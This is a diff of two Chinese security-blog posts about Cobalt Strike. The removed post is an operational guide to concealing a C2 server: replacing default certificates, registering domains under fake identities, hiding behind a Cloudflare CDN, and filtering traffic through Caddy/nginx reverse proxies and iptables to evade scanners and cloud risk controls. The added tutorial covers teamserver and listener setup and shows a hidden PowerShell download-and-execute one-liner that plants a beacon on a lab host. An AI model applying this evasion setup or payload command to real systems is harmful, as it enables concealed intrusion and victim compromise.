@@ -1,313 +1,306 @@
-# CS隐藏随笔
+# Cobalt Strike基础教程（一）
 
 
-CS隐藏随笔
+Cobalt Strike基础教程（一）--v4ler1an
 
 <!--more-->
 
-## 前言
+## 一、基础操作
 
-简单记录下C2的常规隐藏手法，以Cobalt Strike 4.9.1为例。
+### 简介
 
-前期需要准备的东西：
+Cobalt Strike是一款渗透测试神器，简称CS，早期依赖Metasploit框架，现在已作为单独的平台使用。
 
-- vps
-- 域名
-- cdn账号
+Cobalt Strike集成了端口转发、扫描、监听Listener、Windows exe程序payload生成、Windows DLL动态链接库payload生成、java程序payload生成、office宏代码payload生成，还包括站点克隆、获取浏览器的相关信息等功能。
 
-## 端口特征修改
+![image-20240222143954956](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png)
 
-在teamserver文件中，给CS配置的默认端口为50050，我们可以根据需要修改为自己需要的端口号：
+### 组织结构
 
-![image-20240226194303133](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402261943178.png)
+Cobalt Strike采用的是C/S架构，server端连接到目标服务器，client再连接server。所以，client不会直接与目标服务器进行交互。设计的主要目的是为了分布式团队协作。
 
-## 证书特征修改
-
-Cobalt Strike默认使用的证书有三个：
-
-- cobaltstrike.store：用于server和client的通信加密
-- proxy.store：用于浏览器代理，client中的browser pivot功能
-- ssl.store：假设在c2.profile配置文件中没有配置http-certificate选项，并且listener使用的是https，CS就会使用这个默认的证书文件。
-
-cobaltstrike.store和ssl.store特征十分明显，已被厂商标记烂了，所以需要自生成替换掉这俩默认的证书。而且，默认使用的密码为123456.
-
-这里使用的工具是`keytool`，一个Java数据证书的管理工具，keytool会将密钥(key)和证书(certificates)保存在一个keystore的文件中，后缀为.store。keytool可以用于生成新的.store，也可以用于查看.store的内容。
-
-默认的cobaltstrike.store文件的内容：
-
-[![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402261953113.png)](https://img.nsg.cn/xxl/2021/12/8e83d480-9c99-4d2d-ba43-cfeec92f2f29.png)
-
-假设使用下面的命令进行特征取出：
+文件目录结构如下：
 
 ```shell
-keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.cn -dname "CN=360, OU=360.cn, O=Sofaware,L=Somewhere,ST=Cyberspace, C=CN"
-# 参数说明如下# -keytool -keystore cobaltstrike.store -storepass 密码# -keypass 密码# -genkey -keyalg RSA# -alias google.com -dname CN=(名字与姓氏),# OU=(组织单位名称), O=(组织名称),# L=(城市或区域名称),# ST=(州或省份名称),# C=(单位的两字母国家代码)。
+┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1]
+└─$ tree -L 2 .
+.
+├── Client
+│   ├── cobaltstrike.auth
+│   ├── cobaltstrike-client.cmd		-- Windows client启动文件
+│   ├── cobaltstrike-client.jar		-- client启动jar文件
+│   ├── cobaltstrike-client.sh		-- Linux/MacOS client启动文件
+│   └── uHook.jar							
+└── Server
+    ├── c2lint				-- 检查profile的错误和异常
+    ├── cobaltstrike.auth
+    ├── cobaltstrike.store              -- server和client加密通信的证书
+    ├── data
+    ├── downloads                       -- 文件下载目录
+    ├── logs                            -- 日志目录
+    ├── screenshots                     -- 截图目录
+    ├── source-common.sh
+    ├── teamserver			-- server启动脚本
+    ├── TeamServerImage			-- 实际的启动elf文件
+    └── third-party		        -- 第三方工具
 ```
 
-去除特征后的内容如下：
 
-[![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402261955236.png)](https://img.nsg.cn/xxl/2021/12/85577d4b-944c-4b4b-b51d-cefd52386edb.png)
 
-但是这种方式并不推荐，我们还可以引入第三方证书来进行设置。
+### 连接方式
 
-这里的证书将结合后面的cdn部分一起进行配置，主要是使用第三方的证书来去除特征，详细的配置步骤放在cdn配置部分中。
+Cobalt Strike的client想要连接server需要知道三个信息：
 
-## 流量特征修改
+- server的外部ip地址
+- serve的连接密码
+- (optional)决定malleable C2工具的哪一个配置文件用于server
 
-### 域名
+#### 开启server
 
-申请域名到https://www.namesilo.com，比较便宜，支持支付宝支付，注册可以使用临时邮箱和虚假身份。
-
-购买完成后，进入Domain Manger，在自己的域名的最后的option部分，点击卡车图标，可以看到分配的DNS解析记录：
-
-![namesilo域名列表](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262004265.png)
-
-我们进入前面的图标，把默认解析记录给删除掉。
-
-### cdn配置
-
-这里使用cloud flare的免费级别的cdn加速即可。
-
-首先绑定域名：
-
-![image-20240226195916494](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402261959542.png)
-
- 输入前面获取的域名，选择最下面的免费计划，
-
-进入站点后，点击左侧的dns，查看Cloud Flare的DNS，记录下两个ns记录：
-
-![image-20240226200114587](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262001635.png)
-
-回到namesilo网站， 进入Domain Manager，点击红框中的图标，设置DNS Server：
-
-![image-20240226200619560](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262006609.png)
-
-把Cloud Flare的两条NS记录添加上：
-
-![image-20240226200713321](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262007370.png)
-
-这样就实现了将自己的域名的所有解析功能都托管在Cloud Flare上，从而实现利用CDN的解析。
-
-回到Cloud Flare的管理页面，添加两条DNS解析记录，IPv4地址写自己的vps服务器的外网ip：
-
-![image-20240226200911538](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262009595.png)
-
-这两条记录有一个是www，另外一个随意。
-
-然后在`规则->页面规则`添加两条规则，url分别为`*.域名/*`、`.域名/*`，选取设置为`缓存级别`，级别为`绕过`:
-
-![image-20221126012104555](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262011542.png)
-
-等待Cloud Flare的CDN配置生效，时间大概在十几分钟到一个小时，可以查看cf的注册邮箱是否收到邮件。
-
-激活成功后，可以ping一下自己的域名：
-
-![image-20240226201652189](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262016245.png)
-
-此时获得ip信息已经不是vps的外网ip，也可以多地ping检查一下：
-
-![image-20240226201803399](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262018463.png)
-
-### 证书和密钥
-
-直接使用cloud flare创建证书和密钥，用于后续的加密通信。
-
-创建证书，如下图：
-
-![image-20221125115833161](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262020271.png)
-
-![image-20221125115949205](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262020522.png)
-
-生成之后，保存到本地的\*.pem和\*.key文件。
-
-然后使用如下命令先生成certout.p12，再生成新的.store：
+开启server的常规命令如下（Linux环境）：
 
 ```shell
-openssl pkcs12 -export -in 保存的源证书.pem -inkey 保存的私钥.key -out 输出的p12文件名(自定义).p12 -name 设置别名 -passout pass:设置密码
-keytool -importkeystore -deststorepass 设置密码 -destkeypass 设置密码 -destkeystore 设置证书文件名.store -srckeystore 上面自定义的p12文件.p12 -srcstoretype PKCS12 -srcstorepass 上面设置的密码 -alias 设置别名
-eg：
-openssl pkcs12 -export -in cert.pem -inkey secret.key -out certout.p12 -name cloudflare_cert -passout pass:753015
-keytool -importkeystore -deststorepass 753015 -destkeypass 753015 -destkeystore bk.store -srckeystore certout.p12 -srcstoretype PKCS12 -srcstorepass 753015 -alias cloudflare_cert
+./teamserver your_ip your_password [config_file]
+
+
+┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Server]
+└─$ sudo ./teamserver 172.16.86.138 v4ler1an
+[sudo] password for v4ler1an:
+
+[*] Will use existing X509 certificate and keystore (for SSL)
+
+[*] Starting teamserver
+[*] Team Server Version: 4.9.1 (Pwn3rs)
+[*] Setting 'https.protocols' system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3
+... ...
+[+] Team server is up on 0.0.0.0:50050
+[*] SHA256 hash of SSL cert is: xxxx
+[+] Listener: test started!
 ```
 
-生成.store文件后，修改teamserver文件中的启动命令中对应的值，密码也直接修改。
+#### client连接server
 
-这里需要记得开启SSL/TLS协议：
-
-![image-20240227100655891](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271006069.png)
-
-在浏览器到Cloud Flare和Cloud Flare到源服务器之间都需要开启SSL/TLS。我这里设置的是自签名的证书，因为前面都是我们自己生成的。
-
-### 修改c2 profile文件
-
-将random_c2profile项目生成随机profile进行二次修改
-项目地址：https://github.com/threatexpress/random_c2_profile
-
-（后续将根据情况再单独出profile文件的详细配置内容。）
-
-将生成的证书信息填写：![image-20240226202904432](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262029535.png)
-
-
-
-这里的keystore部分填写前面证书生成的.store文件；password部分需要与teamserver中的一致。
-
-修改host-stager：
-![](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262026225.jpg)
-
-修改http-config：
-![](/Users/v4ler1an/Documents/Learning/security/pentesting/cs/media/16477923063996/16477940420578.jpg)
-
-修改http-get
-![](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262026239.jpg)
-
-修改http-post
-![](/Users/v4ler1an/Documents/Learning/security/pentesting/cs/media/16477923063996/16477940830973.jpg)
-
-修改完成后，使用`./c2lint [profile]`进行文件检查，没有错误就可以使用了。
-
-![](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402262026235.jpg)
-
-注意：
-1、http-get和http-post的Content-Type需要设置为"application/*; charset=utf-8"否则无法命令执行。
-2、由于配置caddy需要匹配`/js/query-3.*`路径，所以http-get和http-post需设置成`/js/query-3.*`一样的路径，否则无法正常上线。
-
-3、免费版的Cloud Flare对代理的端口有限制，只能改成如下端口：
-
-- http：80、8080、8880、2052、2082、2086、2095
-- https：443、2053、2083、2087、2096、8443
-
-## 反向代理
-
-使用反向代理的目的是隐藏C2，虽然加了CDN，但是直接请求到server还是有点不安稳，nmap的一些扫描脚本可以直接扫描出来，所以还是要加一个反向代理，这样类似腾讯云、阿里云的风控也能绕过了。
-
-### caddy
-
-使用简单、快速配置，地址https://github.com/caddyserver/caddy
-
-安装完成后，在/etc/caddy文件夹下有一个Caddyfile文件，这个是默认的配置文件，我们编辑一下：
-
-```json
-[域名] {
-	tls /root/tools/Server/[证书文件].pem /root/tools/Server/[密钥].key
-	reverse_proxy /js/jquery-3.* https://127.0.0.1:8443 {  # 端口可以自己设置转发的端口，uri需要与c2 profile中的一致
-	# 把对/js/jquery-3.*的请求转发到本地的8443端口
-		transport http {
-			tls
-			tls_insecure_skip_verify
-		}
-		header_up X-Forwarded-For {http.request.header.X-Forwarded-For}
-	}
-	header /* {
-		Server "Caddy" "Tengine"
-	}
-}
-```
-
-修改完成后，在`/etc/caddy`路径下启动caddy：
+client可以在Windows、Linux、MaxOS下运行，根据个人需求来就行。4.9版本的client的目录下的启动文件如下:
 
 ```shell
-caddy run
+┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Client]
+└─$ ls
+cobaltstrike.auth  cobaltstrike-client.cmd  cobaltstrike-client.jar  cobaltstrike-client.sh  uHook.jar
 ```
 
-也可以指定配置文件：
+直接运行对应的文件即可。
+
+![image-20240222142725955](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png)
+
+点击Connect后，第一次连接会有提示信息，要求确认提示信息中的hash是不是server的hash，确认是就点击Yes，就可以进入client的GUI界面：
+
+![image-20240222142904061](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png)
+
+成功连接后，团队成员直接可以直接在client中进行交流沟通，信息共享等。
+
+#### client连接不同的server
+
+Cobalt Strike的设计初衷是在不同的阶段使用不同的server，因此在一次渗透行动中往往会使用到多个server。这样设计的目的主要是进行任务隔离，确保安全，在一个server出现意外停止运行时，不会影响到整个渗透过程。
+
+连接不同的server，在client的左上角的+号，输入server信息即可连接：
+
+![image-20240222145413463](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png)
+
+![image-20240222145445280](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png)
+
+此时在最下方就会有多个server连接的切换条。
+
+### 分布式协作
+
+这里以最基本的团队模型为例，涉及三个server：
+
+- Staging Servers，临时服务器，主要为了在短时间内对目标系统进行访问，也是最开始用于传递payload、获取初始权限的server，承担了初始的权限提升和下载权限维持程序的功能，暴露风险较大。
+- Long Haul Servers，持久化访问服务器，保持对目标网络的长期访问，以较低频率与目标进行通信。
+- Post-Exploitation Servers，后渗透服务器，进行后渗透及横向移动的相关任务，比如与目标进行交互式访问。
+
+#### 可伸缩红队操作模型
+
+Scaling Red Operations，可伸缩红队操作模型，分为两个层次，第一层次是针对单个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。
+
+目标单元的工作：
+
+- 负责具体目标或行动的对象
+- 获得访问权限、后渗透、横向移动
+- 维护本地基础设施
+
+访问管理单元的工作：
+
+- 保持所有目标网络的访问权限
+- 获取访问权限并接收来自单元的访问
+- 根据需要传递对目标单元的访问
+- 为持续回调保持全局基础环境
+
+#### 团队角色
+
+- 初始渗透人员，主要任务是进入目标系统，并扩大立足点
+- 后渗透人员，主要任务是对目标系统进行数据挖掘、对用户进行监控、收集目标系统的密钥、日志等敏感信息
+- 权限管理人员，主要任务是建立基础设施、保持shell的持久化访问、管理回调、传递全局访问管理单元之间的会话
+
+### 日志与报告
+
+#### 日志记录
+
+Cobalt Strike的日志文件在团队服务器下的运行目录中的`logs`文件夹内，其中有些日志文件名例如`beacon_11309.log`，这里的`11309`就是beacon会话的ID。
+
+按键的日志在`keystrokes`文件夹内，截屏的日志在`screenshots`文件夹内，截屏的日志名称一般如`screen_015321_4826.jpg`类似，其中`015321`表示时间（1点53分21秒），`4826`表示ID。
+
+#### 导出报告
+
+Cobalt Strike生成报告的目的在于培训或帮助蓝队，在`Reporting`菜单栏中就可以生成报告，关于生成的报告有以下特点：
+
+- 输出格式为PDF或者Word格式
+- 可以输出自定义报告并且更改图标（Cobalt Strike –> Preferences –>Reporting）
+- 可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正。
+
+#### 报告类型
+
+![image-20240222153927259](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png)
+
+- 活动报告（Activity Report）
+
+  提供红队活动的时间表，记录了每个后渗透活动。
+
+- 主机报告（Hosts Report）
+
+  汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也包含在报告内。
+
+- 入侵指标报告（Indicators of Compromise）
+
+  包括对C2扩展文件的分析、使用的域名和上传文件的md5。
+
+- 会话报告（Sessions Report）
+
+  记录了每个会话的指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。
+
+- 社工报告（Social Engineering Report）
+
+  记录了每一轮网络钓鱼的电子邮件、谁点击了邮件以及从每个点击用户处收集的信息。该报告还显示了CS的System profiler发现的应用程序。
+
+- TTP报告（Tactics，Techniques，and Procedures）
+
+  将自己的CS行动与ATT&CK矩阵进行映射，给出具体的ttp。
+
+## 二、基础设施
+
+### Listener管理
+
+定义：等待受害目标回连自己的一个服务。
+
+作用：主要是为了接受payload回传的各类数据，类似于msf中的handler。例如，payload在目标机器执行后，就会回连到listener然后下载执行真正的shellcode代码。一旦listener建立成功，团队成员只需要知道这个listener的名称即可，不必关心listener背后的基础环境。
+
+一个listener由用户定义的名称、payload类型和几个特定于payload的选项组成。Listener的名字一般由以下结构组成：
 
 ```shell
-caddy run --config /etc/caddy/Caddyfile
+// 操作系统/攻击载荷/传输器
+Operating System/Payload/Stager
+
+
+example:
+windows/beacon_http/reverse_http
 ```
 
-启动成功后，反代配置完成。
+#### Stager
 
-![image-20240227111422251](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271114431.png)
+payload是需要执行的具体攻击内容，通常分为两部分：stager和stage。
 
-### nginx
+stager是一个体积较小的程序，用于连接、下载stage，并插入到内存中。
 
-nginx的配置与caddy基本一样，也是将本地的443端口流量转发到本地的8443端口并匹配路径为`/js/jquery-3.*`：
+为什么会有stager的概念？这是因为在很多攻击中，对于能加载到内存并在成功漏洞利用后执行的数据大小存在严格的限制，这就导致在攻击成功时，很难嵌入额外的payload，因此出现了stager。
 
-```nginx
-http {
-        server {
-            listen 443 ssl;
-            server_name [域名];
+#### 创建Listener
 
-            ssl_certificate /root/tools/Server/[证书文件].pem;
-            ssl_certificate_key /root/tools/Server/[密钥].key;
+在CS的client中打开Cobalt Strike -> Listeners，之后点击下方的Add，弹出New Listener窗口：
 
-            location ~* /js/jquery-3. {
-                if ($host != "[域名]") {
-                return 403;
-                }
-                if ($http_user_agent != "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36") {
-		return 403;
-                }
-		proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-                proxy_pass  https://127.0.0.1:8443;
-            }
-        }
-}
+![image-20240222173802492](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png)
+
+CS的listener目前有三种类型：
+
+- Beacon类型：直译是信标的意思，是以一种比较隐蔽的后渗透代理，也是CS默认使用的一种类型。Beacon Listener的名称例子如下：
+
+  ```shell
+  windows/beacon_http/reverse_http
+  ```
+
+- Foreign类型：外部listener，主要作用是给其他的payload提供别名，比如msf中的payload。该类型的listener主要是为了提升CS的兼容性，payload可以使用其他的软件生成，但是可以适配CS的listener：
+
+  ```shell
+  windows/foregin/reverse_https
+  ```
+
+- External C2（新增）：使用其他类型的C2，是新增选项，允许第三方程序使用外部C2服务器与CS的server进行交互。
+
+![image-20240222173926470](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png)
+
+### HTTP和HTTPS Beacon
+
+**Beacon**
+
+- Beacon是CS的Payload
+- Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。
+- 通过HTTP、HTTPS和DNS出口网络
+- 使用SMB协议的时候是点对点通信
+- Beacon有很多的后渗透攻击模块和远程管理工具
+
+**Beacon的类型**
+
+- HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。
+
+```
+  windows/beacon_http/reverse_http
+  windows/beacon_https/reverse_https
 ```
 
-需要注意的是，这里配置了UA，否则返回403。
+- DNS Beacon
 
-### iptables
-
-因为设置了端口转发，443->8443，所以需要设置一下iptabes，把对8443端口的访问限制在本机：
-
-```shell
-iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8443 -j ACCEPT
-iptables -A INPUT -p tcp --dport 8443 -j DROP
+```
+  windows/beacon_dns/reverse_dns_txt
+  windows/beacon_dns/reverse_http
 ```
 
-只允许本机访问8443:
+- SMB Beacon SMB Beacon也可以叫做pipe beacon
 
-![image-20240227111545168](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271115343.png)
+```
+  windows/beacon_smb/bind_pipe
+```
 
-## 上线效果
+**创建HTTP Beacon**
 
-上述工作都完成后，CS可以成功上线，并且通信加密，nmap也扫描不出来。
+点击 Cobalt Strike –> Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save。
 
-![image-20240227111655010](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271116219.png)
+![image-20240223110739474](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png)
 
-## 补充
+测试一下刚才设置的监听器，点击Attack –> Web Drive-by –> Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，最后点击Launch:
 
-### 1. 端口限制
+![image-20240223111429362](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png)
 
-如果是国内的VPS，对于常见的80、8080、443、8443端口可能无法直接使用，所以需要使用一些非常见的端口。
+![image-20240223110840913](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png)
 
-而且免费版本的Cloud Flare对能使用的端口有限制：
+复制弹窗中的命令到靶机中执行：
 
-- http：80、8080、8880、2052、2082、2086、2095
-- https：443、2053、2083、2087、2096、8443
+```powershell
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.86.138:80/test'))"
+```
 
-所以如果80、8080、443、8443用不了，就可以用2052，2087这种端口。
+![image-20240223111527176](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png)
 
-### 2. http上线
+回到CS，靶机已经上线：
 
-以上针对的是https的beacon，http的话在DNS中加一个二级域名并使用该二级域名上线即可。不用额外再弄一个profile，因为http的beacon只看域名。 在http的raw payload中我们可以验证这一点：
+![image-20240223111606515](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png)
 
-![Image](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271530670.png)
+![image-20240223111800363](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png)
 
-对比https的raw payload，它用上了我们之前配置的所有内容：
+**HTTPS Beacon**
 
-![Image](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271530837.png)
+HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：https://www.cobaltstrike.com/help-malleable-c2#validssl。
 
-### 3. CF不支持域前置
+### DNS Beacon
 
-Cloudflare目前已经不支持域前置，所以上面的操作只能隐藏真实的ip，但是无法隐藏C2使用的域名，会在流量的Host字段中显示出来。AWS 的CloudFront目前也已经不再支持。
-
-有一种类似于Domain Fronting的方法。就是使用一个同样接入了CloudFlare，与目标域名指向相同IP但没有被墙的域名作为SNI。前提是必须要有而且知道这个域名。
-
-## 域前置Domain Fronting
-
-https://evi1cg.me/archives/Domain_Fronting.html
-
-https://www.bamsoftware.com/papers/fronting/
-
-
-
-
-
-
-析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。
+使用DNS请求将Beacon返回。这些DNS请求用于解析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。
 
 在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。
 
